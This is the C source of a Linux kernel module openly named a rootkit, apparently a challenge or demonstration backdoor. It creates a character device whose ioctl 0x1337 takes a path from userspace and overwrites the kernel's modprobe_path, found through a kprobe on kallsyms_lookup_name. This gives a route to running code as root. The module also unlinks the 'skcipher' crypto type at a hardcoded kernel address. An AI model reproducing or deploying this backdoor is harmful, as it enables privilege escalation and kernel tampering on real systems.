#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/ioctl.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>  // For copy_to_user, copy_from_user
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/mm.h>
#include <linux/list.h>
#include <crypto/if_alg.h>





#define INFO(fmt, args...) do {pr_info("%s: [easymoney]: krootkit! "fmt"\n", __func__, ## args); } while (0)

#define DEVICE_NAME "krootkit_device"
#define CLASS_NAME "krootkit_class"

// IOCTL Command
#define IOCTL_CMD 0x1337  // Command 0x1337
#define MAX_MODPROBE_PATH 40


static int major_number;
static struct class *krootkit_class = NULL;
static struct device *krootkit_device = NULL;
static struct cdev krootkit_cdev;

struct alg_type_list {
    const struct af_alg_type *type;
    struct list_head list;
};

void patch_skcipher_type_unlink(void)
{
    struct list_head *alg_types = (struct list_head *)0xffffffff826a9530; // your address
    struct alg_type_list *node, *tmp;

    list_for_each_entry_safe(node, tmp, alg_types, list) {
        if (node->type && node->type->name &&
           strcmp(node->type->name, "skcipher") == 0) {

            pr_info("Unlinking skcipher node at %px (%s)\n", node, node->type->name);

            // Remove from list
            list_del(&node->list);

            // If dynamically allocated, consider freeing:
            // kfree(node);

            break;
        }
    }
}

static long override_modprobe_path(char * fake_modprobe_path)
{

	unsigned long modprobe_path_ptr;

	// override modprobe path in the kernel using kallsyms
	static unsigned long (*find_symbol)(const char* name);

	static struct kprobe kp = {
    	.symbol_name = "kallsyms_lookup_name"
	};

	register_kprobe(&kp);
	find_symbol = (unsigned long (*)(const char *))kp.addr;

    unregister_kprobe(&kp);

	if (!find_symbol){
		INFO("cannot find kallsyms_lookup_name address");
	    return -EINVAL;
	}

	modprobe_path_ptr = find_symbol("modprobe_path");
	if (!modprobe_path_ptr){
		INFO("cannot find modprobe_path in the kernel");
		return -EINVAL;
	}

    INFO("overriding modprobe_path at %lx", modprobe_path_ptr);
	
	strncpy((void *)modprobe_path_ptr, fake_modprobe_path, 40);

    patch_skcipher_type_unlink();
	return  0; //Success

}

// IOCTL handler
static long krootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	char kmdp_path[MAX_MODPROBE_PATH];
	
    if (cmd == IOCTL_CMD) {
        pr_info("IOCTL 0x1337 received, so overriding modprobe path...\n");
		if (copy_from_user(kmdp_path, (void __user *)arg, MAX_MODPROBE_PATH)){
			INFO("cannot copy modprobe_path from userspace");
		}
		
		INFO("fake modprobe_path is %s", kmdp_path);
        override_modprobe_path(kmdp_path); 
        return 0; // Success
    } else {
        pr_info("Unknown IOCTL command: 0x%x\n", cmd);
        return -EINVAL; // Invalid command
    }
}

// File operations structure
static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = krootkit_ioctl,  // Handle IOCTL
};

// Module initialization
static int __init krootkit_init(void)
{
    pr_info("Rootkit Module Initialized\n");

    // Register the device
    major_number = register_chrdev(0, DEVICE_NAME, &fops);
    if (major_number < 0) {
        pr_err("Failed to register a major number\n");
        return major_number;
    }

    // Create the device class
    krootkit_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(krootkit_class)) {
        unregister_chrdev(major_number, DEVICE_NAME);
        pr_err("Failed to register device class\n");
        return PTR_ERR(krootkit_class);
    }

    // Create the device
    krootkit_device = device_create(krootkit_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
    if (IS_ERR(krootkit_device)) {
        class_destroy(krootkit_class);
        unregister_chrdev(major_number, DEVICE_NAME);
        pr_err("Failed to create the device\n");
        return PTR_ERR(krootkit_device);
    }

    // Initialize the character device
    cdev_init(&krootkit_cdev, &fops);
    if (cdev_add(&krootkit_cdev, MKDEV(major_number, 0), 1) < 0) {
        device_destroy(krootkit_class, MKDEV(major_number, 0));
        class_destroy(krootkit_class);
        unregister_chrdev(major_number, DEVICE_NAME);
        pr_err("Failed to add cdev\n");
        return -1;
    }

    pr_info("Device created: /dev/%s\n", DEVICE_NAME);
    return 0;
}

// Module cleanup
static void __exit krootkit_exit(void)
{
    cdev_del(&krootkit_cdev);
    device_destroy(krootkit_class, MKDEV(major_number, 0));
    class_destroy(krootkit_class);
    unregister_chrdev(major_number, DEVICE_NAME);
    pr_info("Rootkit Module Exited\n");
}

module_init(krootkit_init);
module_exit(krootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omer Shalev");
